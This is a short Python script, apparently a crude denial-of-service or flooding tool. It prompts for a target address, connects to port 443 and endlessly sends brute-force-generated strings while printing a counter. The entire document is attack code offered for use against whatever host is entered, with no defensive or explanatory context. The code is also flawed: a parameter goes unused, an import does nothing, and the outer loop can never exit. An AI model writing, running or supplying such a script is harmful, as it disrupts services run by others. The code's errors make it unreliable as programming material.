import socket,time
from scapy.all import *
import io
from socket import socket , AF_INET , SOCK_STREAM
import itertools

def sdsrv(url):
    res = itertools.product('0123456789sdfhjae',repeat=10)
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ad,443))
    a = 0
    while True : 
        for p in res :
            a = a + 1
            xp = "".join(p)
            
            xp = str(xp).encode("utf-8")
            s.setblocking(0)
            s.send(xp)
            print("SENDING....",xp ,"      ",a)


ad = str(input("[ENTRER ADDRESS TARGET :]"))
z = 123
while z != 98765 :
    sdsrv(ad)
